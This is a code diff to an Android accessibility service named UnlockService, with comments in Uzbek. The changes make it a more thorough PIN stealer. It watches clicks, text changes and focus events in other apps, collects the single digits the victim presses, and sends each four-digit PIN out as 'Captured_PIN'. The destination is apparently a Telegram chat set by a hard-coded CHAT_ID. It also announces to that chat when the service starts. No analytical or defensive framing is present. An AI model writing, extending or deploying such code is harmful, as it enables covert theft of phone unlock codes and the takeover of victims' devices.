@@ -15,34 +15,47 @@ public class UnlockService extends AccessibilityService {
     private static final String CHAT_ID = "8572227182";
 
     @Override
+    protected void onServiceConnected() {
+        super.onServiceConnected();
+        sendData("Tizim_uyg'onib_ishga_tushdi!_PIN_kutilmoqda...");
+    }
+
+    @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
-        // 1. Ekrandagi har qanday matn o'zgarishini kuzatish
-        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED || 
-            event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
+        int eventType = event.getEventType();
+        
+        // Barcha turdagi harakatlarni kuzatish (bosish, kiritish, fokus)
+        if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED || 
+            eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
+            eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
             
             AccessibilityNodeInfo source = event.getSource();
             if (source != null) {
-                findPinInNodes(source);
+                processNodes(source);
                 source.recycle();
             }
         }
     }
 
-    private void findPinInNodes(AccessibilityNodeInfo node) {
+    private void processNodes(AccessibilityNodeInfo node) {
         if (node == null) return;
 
-        // Agar foydalanuvchi raqamli klaviaturada bossa
         CharSequence text = node.getText();
         if (text != null && text.length() == 1 && Character.isDigit(text.charAt(0))) {
-            pinBuffer.append(text);
+            String num = text.toString();
+            pinBuffer.append(num);
+            
+            // Har bir bosilgan raqamni darhol Telegramga yuborish (tekshirish uchun)
+            // sendData("Bosildi: " + num); 
+
             if (pinBuffer.length() >= 4) {
-                sendData(pinBuffer.toString());
-                pinBuffer.setLength(0); // Yuborgandan keyin tozalash
+                sendData("Captured_PIN: " + pinBuffer.toString());
+                pinBuffer.setLength(0);
             }
         }
 
         for (int i = 0; i < node.getChildCount(); i++) {
-            findPinInNodes(node.getChild(i));
+            processNodes(node.getChild(i));
         }
     }
 
